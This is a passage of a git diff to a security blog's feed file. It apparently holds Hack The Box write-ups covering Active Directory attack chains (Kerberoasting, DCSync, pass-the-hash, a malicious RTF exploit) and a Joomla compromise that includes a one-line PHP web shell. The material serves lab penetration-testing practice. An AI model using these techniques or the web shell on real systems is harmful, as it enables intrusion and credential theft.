bypass by moving it to the Windows temp folder and are faced with another error requiring us to authenticate to the network. We add amanda’s credentials as flags to the Rubeus tool and manage to kerberoast mrkly. We crack his TGS hash and are able to get the password. We then proceed to DCSync and obtain the NTLM hash for the administrator account and PTH to gain complete access. Bonus: Bypassing PowerShell Constrained Language Mode, dodging Applocker, authenticating to the network and Kerberoasting all in a one-liner and without touching disk. Joke Section: Pwning the box with ZeroLogon XD]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Reel (AD Pentesting Track #6)</title><link href="https://omnisl4sh.github.io/2022/04/30/Reel.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Reel (AD Pentesting Track #6)" /><published>2022-04-30T00:00:00+02:00</published><updated>2022-04-30T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/30/Reel</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/30/Reel.html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><img src="/assets/Sizzle/zero-logon-XD.jpg" alt="zero-logon-XD" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary A Windows Domain Controller machine. We find an SMB share containing a writable folder called Public. We place an SCF file there that directs the visiting user’s computer to our listening responder where we capture his NTLMv2 hash. After cracking it, we get the password for the amanda user which we use to enumerate the domain using BloodHound. Noticing that our user has PowerShell Remoting capabilities, we try to gain access but are faced with a strange authentication error. Upon inspecting the functionality of the Evil-Winrm tool, we find that we can use a certificate for logging in. We create a Certificate Signing Request using openssl and get it signed from the ADCS Web Interface found on the domain controller. Using evil-winrm‘s ability to authenticate using SSL certificates, we successfully achieve code execution. Looking back at the output of BloodHound showed a kerberoastable user called mrlky that has dangerous rights abusable for a DCSync attack. We decide to use Rubeus.exe to do the job but can’t execute it due to Applocker restrictions. We bypass by moving it to the Windows temp folder and are faced with another error requiring us to authenticate to the network. We add amanda’s credentials as flags to the Rubeus tool and manage to kerberoast mrkly. We crack his TGS hash and are able to get the password. We then proceed to DCSync and obtain the NTLM hash for the administrator account and PTH to gain complete access. Bonus: Bypassing PowerShell Constrained Language Mode, dodging Applocker, authenticating to the network and Kerberoasting all in a one-liner and without touching disk. Joke Section: Pwning the box with ZeroLogon XD]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Reel (AD Pentesting Track #6)</title><link href="http://localhost:4000/2022/04/30/Reel.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Reel (AD Pentesting Track #6)" /><published>2022-04-30T00:00:00+02:00</published><updated>2022-04-30T00:00:00+02:00</updated><id>http://localhost:4000/2022/04/30/Reel</id><content type="html" xml:base="http://localhost:4000/2022/04/30/Reel.html"><![CDATA[<h3 id="summary">Summary</h3>
 <ul>
   <li>A <strong>windows machine</strong> with <code class="language-plaintext highlighter-rouge">Anonymous FTP</code> allowed. <em>Inspecting the contents</em> reveals a <strong>documents folder</strong> one of which tells us that <em>RTF documents are being reviewed and converted by someone</em>.</li>
   <li><em>Using this information,</em> we craft a <em>malicious document</em> using <strong>CVE-2017-0199</strong> and send it to a certain user called <code class="language-plaintext highlighter-rouge">nico</code> via the open <code class="language-plaintext highlighter-rouge">SMTP</code> port (<em>We find his username by checking the metadata of the documents on FTP</em>).</li>
@@ -1087,7 +1451,7 @@ $ErrorActionPreference = 'continue'
 
 <p><img src="/assets/Reel/print-ops-and-load-driver.jpg" alt="print-ops-and-load-driver" /></p>
 
-<p><em>However,</em> exploiting this would be challenging to achieve specially with the <strong>Group Policy</strong> restrictions in place.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary A windows machine with Anonymous FTP allowed. Inspecting the contents reveals a documents folder one of which tells us that RTF documents are being reviewed and converted by someone. Using this information, we craft a malicious document using CVE-2017-0199 and send it to a certain user called nico via the open SMTP port (We find his username by checking the metadata of the documents on FTP). When the document is opened, we get a shell back as nico and start enumerating the machine. With BloodHound, we find that nico has a WriteOwner right over another user herman who has a WriteDACL over a certain group called Backup_Admins. We abuse the WriteOwner right to grant ourselves the right to reset herman’s password and abuse the WriteDACL to add him to the Backup_Admins group. We then find out that Backup_Admins have access to a certain folder called Backup Scripts on the Administrator’s desktop on the box. Within that folder, we find a script that contains the password for the local administrator which works and we use it to login using the open SSH port. A Similar path exists with another user tom whom his credentials are present in a creds.xml file on nico’s desktop as a secure string. The clear-text credentials can be retrieved to gain access as tom using SSH. tom has WriteOwner on claire who has a WriteDACL on Backup_Admins. Another path exists with abusing the SeLoadDriverPrivilege held by tom since he’s a member of the Print Operators group. The box is also vulnerable to CVE-2018-8440 and CVE-2019-1458 local privilege escalation exploits.]]></summary></entry><entry><title type="html">AD Pentesting | Domain Privesc - PetitPotam</title><link href="https://omnisl4sh.github.io/2022/04/28/PetitPotam.html" rel="alternate" type="text/html" title="AD Pentesting | Domain Privesc - PetitPotam" /><published>2022-04-28T00:00:00+02:00</published><updated>2022-04-28T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/28/PetitPotam</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/28/PetitPotam.html"><![CDATA[<h1 id="introduction--attack-anatomy">Introduction &amp; Attack Anatomy</h1>
+<p><em>However,</em> exploiting this would be challenging to achieve specially with the <strong>Group Policy</strong> restrictions in place.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary A windows machine with Anonymous FTP allowed. Inspecting the contents reveals a documents folder one of which tells us that RTF documents are being reviewed and converted by someone. Using this information, we craft a malicious document using CVE-2017-0199 and send it to a certain user called nico via the open SMTP port (We find his username by checking the metadata of the documents on FTP). When the document is opened, we get a shell back as nico and start enumerating the machine. With BloodHound, we find that nico has a WriteOwner right over another user herman who has a WriteDACL over a certain group called Backup_Admins. We abuse the WriteOwner right to grant ourselves the right to reset herman’s password and abuse the WriteDACL to add him to the Backup_Admins group. We then find out that Backup_Admins have access to a certain folder called Backup Scripts on the Administrator’s desktop on the box. Within that folder, we find a script that contains the password for the local administrator which works and we use it to login using the open SSH port. A Similar path exists with another user tom whom his credentials are present in a creds.xml file on nico’s desktop as a secure string. The clear-text credentials can be retrieved to gain access as tom using SSH. tom has WriteOwner on claire who has a WriteDACL on Backup_Admins. Another path exists with abusing the SeLoadDriverPrivilege held by tom since he’s a member of the Print Operators group. The box is also vulnerable to CVE-2018-8440 and CVE-2019-1458 local privilege escalation exploits.]]></summary></entry><entry><title type="html">AD Pentesting | Domain Privesc - PetitPotam</title><link href="http://localhost:4000/2022/04/28/PetitPotam.html" rel="alternate" type="text/html" title="AD Pentesting | Domain Privesc - PetitPotam" /><published>2022-04-28T00:00:00+02:00</published><updated>2022-04-28T00:00:00+02:00</updated><id>http://localhost:4000/2022/04/28/PetitPotam</id><content type="html" xml:base="http://localhost:4000/2022/04/28/PetitPotam.html"><![CDATA[<h1 id="introduction--attack-anatomy">Introduction &amp; Attack Anatomy</h1>
 
 <p><img src="/assets/petitpotam/Petit-Potam-Flow-Diagram.jpg" alt="Petit-Potam-Flow-Diagram" /></p>
 
@@ -1236,7 +1600,7 @@ Luckily enough, with some simple mitigation steps, this can be resolved.</p>
   <li><strong>GhostPack</strong> for the <strong>Rubeus</strong> tool</li>
   <li><strong>Harshit Rajpal</strong> for the amazing article explaining the attack (https://www.hackingarticles.in/domain-escalation-petitpotam-ntlm-relay-to-adcs-endpoints/)</li>
   <li><strong>Microsoft Support</strong> for the mitigation guide (https://support.microsoft.com/en-gb/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429)</li>
-</ol>]]></content><author><name></name></author><summary type="html"><![CDATA[Introduction &amp; Attack Anatomy]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Resolute (AD Pentesting Track #5)</title><link href="https://omnisl4sh.github.io/2022/04/25/Resolute.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Resolute (AD Pentesting Track #5)" /><published>2022-04-25T00:00:00+02:00</published><updated>2022-04-25T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/25/Resolute</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/25/Resolute.html"><![CDATA[<h3 id="summary">Summary</h3>
+</ol>]]></content><author><name></name></author><summary type="html"><![CDATA[Introduction &amp; Attack Anatomy]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Resolute (AD Pentesting Track #5)</title><link href="http://localhost:4000/2022/04/25/Resolute.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Resolute (AD Pentesting Track #5)" /><published>2022-04-25T00:00:00+02:00</published><updated>2022-04-25T00:00:00+02:00</updated><id>http://localhost:4000/2022/04/25/Resolute</id><content type="html" xml:base="http://localhost:4000/2022/04/25/Resolute.html"><![CDATA[<h3 id="summary">Summary</h3>
 <ul>
   <li>A <strong>Domain controller</strong> box. We first retrieve information about all users using <code class="language-plaintext highlighter-rouge">rpcclient</code> and find <strong>a password in the description field</strong> of one user which doesn’t work.</li>
   <li>We <em>reuse</em> that password and <strong>spray all domain users</strong> and we get <strong>access to another user who has PowerShell remoting privileges</strong>.</li>
@@ -1445,7 +1809,7 @@ sc.exe start dns
   <li>Also, copying the <code class="language-plaintext highlighter-rouge">msfvenom</code> generated locally on the machine dll didn’t work because the antivirus kept eating it up xD</li>
 </ul>
 
-<p><img src="/assets/Resolute/evil-dll-eaten.jpg" alt="evil-dll-eaten" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary A Domain controller box. We first retrieve information about all users using rpcclient and find a password in the description field of one user which doesn’t work. We reuse that password and spray all domain users and we get access to another user who has PowerShell remoting privileges. Browsing the file system, we find a PowerShell transcript file with credentials for another user in a hidden folder. The other user is a member of the DNSAdmins AD Group which can gain system privilges on the machine by means of DLL Injection.]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Blackfield (AD Pentesting Track #4)</title><link href="https://omnisl4sh.github.io/2022/04/18/Blackfield.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Blackfield (AD Pentesting Track #4)" /><published>2022-04-18T00:00:00+02:00</published><updated>2022-04-18T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/18/Blackfield</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/18/Blackfield.html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><img src="/assets/Resolute/evil-dll-eaten.jpg" alt="evil-dll-eaten" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary A Domain controller box. We first retrieve information about all users using rpcclient and find a password in the description field of one user which doesn’t work. We reuse that password and spray all domain users and we get access to another user who has PowerShell remoting privileges. Browsing the file system, we find a PowerShell transcript file with credentials for another user in a hidden folder. The other user is a member of the DNSAdmins AD Group which can gain system privilges on the machine by means of DLL Injection.]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Blackfield (AD Pentesting Track #4)</title><link href="http://localhost:4000/2022/04/18/Blackfield.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Blackfield (AD Pentesting Track #4)" /><published>2022-04-18T00:00:00+02:00</published><updated>2022-04-18T00:00:00+02:00</updated><id>http://localhost:4000/2022/04/18/Blackfield</id><content type="html" xml:base="http://localhost:4000/2022/04/18/Blackfield.html"><![CDATA[<h3 id="summary">Summary</h3>
 <ul>
   <li>A <strong>Domain Controller</strong> machine. We first find <strong>SMB anonymous read access</strong> to a share containing a list of folders which can be used as usernames.</li>
   <li>We perform an <strong>ASREPRoast attack</strong> using the created wordlist to get credentials for the <code class="language-plaintext highlighter-rouge">support</code> user.</li>
@@ -1719,7 +2083,7 @@ expose %abuse% z:
 
 <p><em>having the domain administrator’s hash,</em> we can easily remote in using <strong>PowerShell Remoting</strong> and we’re admin on the box :D</p>
 
-<p><img src="/assets/Blackfield/got-admin.jpg" alt="got-admin" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary A Domain Controller machine. We first find SMB anonymous read access to a share containing a list of folders which can be used as usernames. We perform an ASREPRoast attack using the created wordlist to get credentials for the support user. Using BloodHound to enumerate the domain, we find that this user can reset the password for another account audit2020 After resetting audit2020‘s password, we gain access to the forensic SMB share which has a memory dump of lsass.exe Using Mimikatz to extract hashes from the dump, we gain access to the svc_backup user. svc_backup is a member of the Backup Operators group which have the privilege of backing up most files on the domain controller. We abuse this privilege to back up the NTDS.dit file and the system registry hive which we use to dump all the NTLM hashes of the domain. With the Domain Administrators NTLM hash, we can Pass-the-Hash to gain full access.]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Easy] - Active (AD Pentesting Track #3)</title><link href="https://omnisl4sh.github.io/2022/04/14/Active.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Easy] - Active (AD Pentesting Track #3)" /><published>2022-04-14T00:00:00+02:00</published><updated>2022-04-14T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/14/Active</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/14/Active.html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><img src="/assets/Blackfield/got-admin.jpg" alt="got-admin" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary A Domain Controller machine. We first find SMB anonymous read access to a share containing a list of folders which can be used as usernames. We perform an ASREPRoast attack using the created wordlist to get credentials for the support user. Using BloodHound to enumerate the domain, we find that this user can reset the password for another account audit2020 After resetting audit2020‘s password, we gain access to the forensic SMB share which has a memory dump of lsass.exe Using Mimikatz to extract hashes from the dump, we gain access to the svc_backup user. svc_backup is a member of the Backup Operators group which have the privilege of backing up most files on the domain controller. We abuse this privilege to back up the NTDS.dit file and the system registry hive which we use to dump all the NTLM hashes of the domain. With the Domain Administrators NTLM hash, we can Pass-the-Hash to gain full access.]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Easy] - Active (AD Pentesting Track #3)</title><link href="http://localhost:4000/2022/04/14/Active.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Easy] - Active (AD Pentesting Track #3)" /><published>2022-04-14T00:00:00+02:00</published><updated>2022-04-14T00:00:00+02:00</updated><id>http://localhost:4000/2022/04/14/Active</id><content type="html" xml:base="http://localhost:4000/2022/04/14/Active.html"><![CDATA[<h3 id="summary">Summary</h3>
 <ul>
   <li>A Domain Controller Machine. We first find an SMB share called <code class="language-plaintext highlighter-rouge">Replication</code> which we can <code class="language-plaintext highlighter-rouge">read</code> using <code class="language-plaintext highlighter-rouge">null authentication</code>.</li>
   <li><em>Going through the share,</em> we find a <code class="language-plaintext highlighter-rouge">Groups.xml</code> file containing the encrypted password of the <code class="language-plaintext highlighter-rouge">svc_tgs</code> account.</li>
@@ -1894,7 +2258,7 @@ SMB         10.10.10.100    445    DC               Users
 
 <p>We verify we have code execution with <strong>impacket</strong>’s <code class="language-plaintext highlighter-rouge">psexec.py</code></p>
 
-<p><img src="/assets/Active/got-admin.jpg" alt="got-admin" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary A Domain Controller Machine. We first find an SMB share called Replication which we can read using null authentication. Going through the share, we find a Groups.xml file containing the encrypted password of the svc_tgs account. This password can be easily decrypted using the gpp-decrypt built-in tool and we can authenticate as svc_tgs. We find that we can kerberoast the Domain Administrator and we get his TGS hash. The hash is crackable with John and we retrieve the password to gain full access.]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Easy] - Forest (AD Pentesting Track #1)</title><link href="https://omnisl4sh.github.io/2022/04/08/Forest.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Easy] - Forest (AD Pentesting Track #1)" /><published>2022-04-08T00:00:00+02:00</published><updated>2022-04-08T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/08/Forest</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/08/Forest.html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><img src="/assets/Active/got-admin.jpg" alt="got-admin" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary A Domain Controller Machine. We first find an SMB share called Replication which we can read using null authentication. Going through the share, we find a Groups.xml file containing the encrypted password of the svc_tgs account. This password can be easily decrypted using the gpp-decrypt built-in tool and we can authenticate as svc_tgs. We find that we can kerberoast the Domain Administrator and we get his TGS hash. The hash is crackable with John and we retrieve the password to gain full access.]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Easy] - Forest (AD Pentesting Track #1)</title><link href="http://localhost:4000/2022/04/08/Forest.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Easy] - Forest (AD Pentesting Track #1)" /><published>2022-04-08T00:00:00+02:00</published><updated>2022-04-08T00:00:00+02:00</updated><id>http://localhost:4000/2022/04/08/Forest</id><content type="html" xml:base="http://localhost:4000/2022/04/08/Forest.html"><![CDATA[<h3 id="summary">Summary</h3>
 <ul>
   <li>A Domain Controller machine. <strong>Anonymous LDAP</strong> is enabled which we use to get <strong>a full list of AD users</strong>.</li>
   <li><em>After performing an</em> <strong>ASREPRoast attack</strong>, we end up with a user that has <strong>PowerShell Remoting Access</strong>.</li>
@@ -2232,7 +2596,7 @@ Add-DomainObjectAcl -TargetIdentity "dc=htb,dc=local" -PrincipalIdentity 'HTB.lo
 
 <p><em>Using the administrator NTLM hash,</em> we can use <code class="language-plaintext highlighter-rouge">evil-winrm</code> to remote inside and we’re done with the box :D</p>
 
-<p><img src="/assets/Forest/got-admin.jpg" alt="got-admin" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary A Domain Controller machine. Anonymous LDAP is enabled which we use to get a full list of AD users. After performing an ASREPRoast attack, we end up with a user that has PowerShell Remoting Access. Using BloodHound for Domain Enumeration, we find that the user is member of the Account Operators group which gives him the privilege of adding users to AD groups other than Domain Admins etc. We add our user to a group called ‘Exchange Windows Permissions’ which has a write DACL over the domain. Abusing this privilege lets us give ourselves the DCSync right over the domain using PowerView which lets us grab all its NTLM hashes We use the Domain Administrator’s hash in a simple Pass-the-Hash attack to gain full access.]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Easy] - Sauna (AD Pentesting Track #2)</title><link href="https://omnisl4sh.github.io/2022/04/08/Sauna.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Easy] - Sauna (AD Pentesting Track #2)" /><published>2022-04-08T00:00:00+02:00</published><updated>2022-04-08T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/08/Sauna</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/08/Sauna.html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><img src="/assets/Forest/got-admin.jpg" alt="got-admin" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary A Domain Controller machine. Anonymous LDAP is enabled which we use to get a full list of AD users. After performing an ASREPRoast attack, we end up with a user that has PowerShell Remoting Access. Using BloodHound for Domain Enumeration, we find that the user is member of the Account Operators group which gives him the privilege of adding users to AD groups other than Domain Admins etc. We add our user to a group called ‘Exchange Windows Permissions’ which has a write DACL over the domain. Abusing this privilege lets us give ourselves the DCSync right over the domain using PowerView which lets us grab all its NTLM hashes We use the Domain Administrator’s hash in a simple Pass-the-Hash attack to gain full access.]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Easy] - Sauna (AD Pentesting Track #2)</title><link href="http://localhost:4000/2022/04/08/Sauna.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Easy] - Sauna (AD Pentesting Track #2)" /><published>2022-04-08T00:00:00+02:00</published><updated>2022-04-08T00:00:00+02:00</updated><id>http://localhost:4000/2022/04/08/Sauna</id><content type="html" xml:base="http://localhost:4000/2022/04/08/Sauna.html"><![CDATA[<h3 id="summary">Summary</h3>
 <ul>
   <li>We find a <strong>domain controller</strong> with <strong>IIS</strong> running on port 80.</li>
   <li>It turns out to be the <strong>company website</strong> and we create a <strong>list of usernames</strong> from the <strong>‘Meet the Team’ page</strong>.</li>
@@ -2476,506 +2840,4 @@ INFO: Done in 00M 28S
 
 <p><em>With the</em> <code class="language-plaintext highlighter-rouge">administrator</code>‘<em>s hash,</em> we can easily get a shell on the box using <code class="language-plaintext highlighter-rouge">evil-winrm</code>’s <code class="language-plaintext highlighter-rouge">-H</code> flag to run what’s called a <code class="language-plaintext highlighter-rouge">pass-the-hash</code> attack.</p>
 
-<p><img src="/assets/Sauna/got-admin.jpg" alt="got-admin" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary We find a domain controller with IIS running on port 80. It turns out to be the company website and we create a list of usernames from the ‘Meet the Team’ page. We try ASREPRoasing and get creds for a user with PowerShell Remoting capabilities. Enumerating Autologon, we find creds for another user with DCSync privileges which we use to dump all domain NTLM hashes.]]></summary></entry><entry><title type="html">HTB Writeup [Linux - Easy] - Curling</title><link href="https://omnisl4sh.github.io/2022/03/29/Curling.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Easy] - Curling" /><published>2022-03-29T00:00:00+02:00</published><updated>2022-03-29T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/03/29/Curling</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/03/29/Curling.html"><![CDATA[<h3 id="summary">Summary</h3>
-<ul>
-  <li>we find <strong>Joomla</strong> running on HTTP port 80 and we get a <strong>list of usernames</strong> <em>from the posts on the main page.</em></li>
-  <li><em>Inspecting the home page’s source code,</em> we find a comment about a <code class="language-plaintext highlighter-rouge">secret.txt</code> file which happens to be at the webroot.</li>
-  <li>The contents of the file reveal a <strong>base64-encoded password</strong> which we use to <em>gain administrative access</em> to <strong>Joomla</strong> using the <code class="language-plaintext highlighter-rouge">floris</code> user.</li>
-  <li>We <em>abuse</em> the <strong>Joomla Administrator’s</strong> ability to <em>edit PHP files</em> to place a <strong>reverse shell</strong> and gain access as the <code class="language-plaintext highlighter-rouge">www-data</code> user.</li>
-  <li>We find a <strong>readable hexdump</strong> called <code class="language-plaintext highlighter-rouge">password_backup</code> in <code class="language-plaintext highlighter-rouge">floris</code>’s home folder which we <em>reverse</em> to a binary and <em>decompress</em> to gain the password for the <code class="language-plaintext highlighter-rouge">floris</code> user.</li>
-  <li><em>Detecting unusal activity on the box</em> with <code class="language-plaintext highlighter-rouge">pspy</code> reveals a <em>cron job running as</em> <code class="language-plaintext highlighter-rouge">root</code> and executing a <code class="language-plaintext highlighter-rouge">curl</code> command that <em>reads its configuration from a file we can modify.</em></li>
-  <li><em>Abusing</em> <code class="language-plaintext highlighter-rouge">curl</code> for <strong>privileged read/write access</strong> lets us get a shell as <code class="language-plaintext highlighter-rouge">root</code> by <em>forging our own</em> <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file.</li>
-</ul>
-
-<hr />
-
-<h3 id="nmap">Nmap</h3>
-<p>We start out by doing the standard nmap with <code class="language-plaintext highlighter-rouge">-sC</code> and <code class="language-plaintext highlighter-rouge">-sV</code> flags:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
-|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
-|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-generator: Joomla! - Open Source Content Management
-|_http-title: Home
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre></div></div>
-<p>The <code class="language-plaintext highlighter-rouge">http-generator</code> <strong>NSE script</strong> showed <strong>Joomla</strong> as the web app on port 80. so we go ahead and check it out.</p>
-
-<h3 id="checking-joomla-out">Checking Joomla Out</h3>
-
-<p><img src="/assets/curling/Homepage.jpg" alt="Homepage" /></p>
-
-<p>We notice two potential usernames:</p>
-<ol>
-  <li><code class="language-plaintext highlighter-rouge">super user</code></li>
-  <li><code class="language-plaintext highlighter-rouge">floris</code></li>
-</ol>
-
-<p>which could be of use. so we note them down. and try logging in with weak passwords like:</p>
-<ul>
-  <li>password</li>
-  <li>Password</li>
-  <li>P@ssw0rd</li>
-  <li>P@$$w0rd</li>
-  <li>admin</li>
-  <li>root</li>
-</ul>
-
-<p>but they don’t work with either users.</p>
-
-<p>so we visit <code class="language-plaintext highlighter-rouge">http://10.10.10.150/README.txt</code> to check out <strong>Joomla’s version</strong> and we notice it is <strong>3.8</strong></p>
-
-<p><img src="/assets/curling/Joomla-Version.jpg" alt="Joomla-Version" /></p>
-
-<p>we try doing a quick searchsploit <em>excluding Joomla Components</em> (<em>since there were a TON of them!</em>). but see no clear match of the version we detected.</p>
-
-<p><img src="/assets/curling/searchsploit.jpg" alt="searchsploit" /></p>
-
-<h3 id="specialized-scanner-joomscan">Specialized Scanner: Joomscan</h3>
-
-<p>so we check to see if we can run a <strong>specialized scanner</strong> for Joomla (<em>since it’s a well-known CMS</em>). <em>After some research,</em> we find a tool called <code class="language-plaintext highlighter-rouge">joomscan</code>. We check out its help menu and notice it’s pretty straight forward. It accepts the <code class="language-plaintext highlighter-rouge">url</code> and give us the option to enumerate compoents using the <code class="language-plaintext highlighter-rouge">-ec</code> flag. <em>This could benefit us since we have noticed a million exploits for vulnerable Joomla components</em>.</p>
-
-<p><img src="/assets/curling/joomscan-help.jpg" alt="joomscan-help" /></p>
-
-<p><em>After running a scan,</em> we find that:</p>
-<ul>
-  <li>There wasn’t a firewall detected. which is nice :D</li>
-  <li>The Joomla version was indeed 3.8.8 and wasn’t vulnerable.</li>
-  <li>The <strong>Administrator panel</strong> is at <code class="language-plaintext highlighter-rouge">http://10.10.10.150/administrator/</code></li>
-  <li>we find <code class="language-plaintext highlighter-rouge">directory listing</code> enabled on a couple of interesting urls:
-    <ol>
-      <li><code class="language-plaintext highlighter-rouge">/administrator/components</code></li>
-      <li><code class="language-plaintext highlighter-rouge">/administrator/modules</code></li>
-      <li><code class="language-plaintext highlighter-rouge">/administrator/templates</code></li>
-    </ol>
-  </li>
-  <li>we find the components within the cms:
-    <ol>
-      <li>com_ajax</li>
-      <li>com_banners</li>
-      <li>com_contact</li>
-      <li>com_content</li>
-      <li>com_contenthistory</li>
-      <li>com_fields</li>
-      <li>com_finder</li>
-      <li>com_mailto</li>
-      <li>com_media</li>
-      <li>com_newsfeeds</li>
-      <li>com_search</li>
-      <li>com_users</li>
-      <li>com_wrapper</li>
-    </ol>
-  </li>
-</ul>
-
-<p>So we browse those directories for a bit to find out there wasn’t much valuable information there.</p>
-
-<p>We also do <code class="language-plaintext highlighter-rouge">searchsploit</code> queries for the components found but we don’t find any exploits for them.</p>
-
-<h3 id="checking-source-code">Checking Source Code</h3>
-
-<p><em>Since the situation wasn’t looking too good with the “looking for an exploit” path,</em> we go back to the basics and look at the source code of the home page.
-And lo and behold! we find a comment right at the bottom saying <code class="language-plaintext highlighter-rouge">secret.txt</code>!</p>
-
-<p><img src="/assets/curling/secret-comment.jpg" alt="secret-comment" /></p>
-
-<p>we can get a cleaner view if we grep for comments after <em>curling</em> the page:</p>
-
-<p><img src="/assets/curling/comment-curl.jpg" alt="comment-curl" /></p>
-
-<p><em>Anyway,</em> we browse to <code class="language-plaintext highlighter-rouge">/secret.txt</code> to find some text:</p>
-
-<p><img src="/assets/curling/secret.jpg" alt="secret" /></p>
-
-<p>I immediately try the text as the password on the admin panel with the users:</p>
-<ol>
-  <li>floris</li>
-  <li>superuser</li>
-  <li>admin</li>
-  <li>administrator</li>
-</ol>
-
-<p>but nothing!</p>
-
-<h3 id="its-not-a-complex-password--its-base64-encoded">It’s not a complex password … it’s Base64 encoded</h3>
-
-<p><em>Despite that,</em> seeing this file hidden in the comments + it being called <code class="language-plaintext highlighter-rouge">secret.txt</code> are factors making me consider that it’s important. Something must be missing here… I go for a walk and come back to decide maybe this text <em>isn’t some randomly-generated password</em> and is encrypted or something. So i drop it onto <code class="language-plaintext highlighter-rouge">CyberChef</code> (https://gchq.github.io/CyberChef/). It was a base64 encoded text » <code class="language-plaintext highlighter-rouge">Curling2018!</code>.</p>
-
-<p><img src="/assets/curling/Cracked.jpg" alt="cracked" /></p>
-
-<p>We use this with the <code class="language-plaintext highlighter-rouge">floris</code> user and we are logged in as the <code class="language-plaintext highlighter-rouge">Super User</code>!</p>
-
-<p>I thought to myself like “why you no think of this earlier?” XD</p>
-
-<p><img src="/assets/curling/logged-in.jpg" alt="logged-in" /></p>
-
-<h3 id="admin-on-joomla--php-code-execution">Admin on Joomla = PHP Code Execution</h3>
-
-<p>Being logged in as the administrative user on Joomla means an <strong>easy shell</strong>.</p>
-
-<p><code class="language-plaintext highlighter-rouge">Extensions -&gt; Templates -&gt; Templates --&gt; Select the Theme in Use --&gt; Edit Index.php for a PHP reverse shell</code> (https://pentestmonkey.net/tools/web-shells/php-reverse-shell)</p>
-
-<p>Not the most stealthy option I know. But this is a CTF XD</p>
-
-<p><em>If it were a real-world scenario though,</em> I would have set up a much more subtle payload like <code class="language-plaintext highlighter-rouge">php exec($_REQUEST["cmd"]);</code></p>
-
-<p><img src="/assets/curling/revvy.jpg" alt="revvy" /></p>
-
-<p><em>After upgrading our shell to fully-interactive TTY,</em> we start checking the system…</p>
-
-<h3 id="browsing-user-home-folders">Browsing user home folders</h3>
-
-<p>We find the user <code class="language-plaintext highlighter-rouge">floris</code> on the system. And, <em>as we’re browsing through his/her home folder,</em> we see two <em>non-standard</em> items:</p>
-<ol>
-  <li>a file called <code class="language-plaintext highlighter-rouge">password_backup</code> that we have read access to.</li>
